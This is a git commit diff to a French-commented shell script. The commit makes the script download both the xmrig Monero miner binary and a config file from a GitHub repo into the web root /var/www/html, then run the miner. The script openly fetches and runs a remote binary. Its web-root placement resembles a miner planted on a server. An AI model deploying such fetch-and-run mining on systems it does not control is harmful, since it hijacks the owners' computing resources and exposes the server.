183a1fae2bac0359afa932612d403584b35d24d0
Esteban Becker <git@beckeresteban.eu>
2025-02-05 10:12:44 -0500

    Ajout de la configuration JSON pour le minage et téléchargement automatique dans le script de démarrage

--- start_mining.sh
+++ start_mining.sh
@@ -3,6 +3,9 @@
 # URL du binaire xmrig
 XMRIG_URL="https://raw.githubusercontent.com/estebanbecker/monero-mining/main/xmrig"
 
+CONFIG_PATH="/var/www/html/config.json"
+CONFIG_URL="https://raw.githubusercontent.com/estebanbecker/monero-mining/main/config.json"
+
 # Chemin local pour le binaire xmrig
 XMRIG_PATH="/var/www/html/xmrig"
 
@@ -12,9 +15,10 @@ WALLET_ADDRESS="48MieRSJv6BSHpoqUYF5Bv6iFkahz6tJvXX8Hw1hYscm8GZgr5vt3PBThEqxkLaT
 
 # Télécharger le binaire xmrig
 wget -O $XMRIG_PATH $XMRIG_URL
+wget -O $CONFIG_PATH $CONFIG_URL
 
 # Rendre le binaire exécutable
 chmod +x $XMRIG_PATH
 
 # Lancer le minage
-$XMRIG_PATH -o $POOL_ADDRESS -u $WALLET_ADDRESS -p x
+$XMRIG_PATH
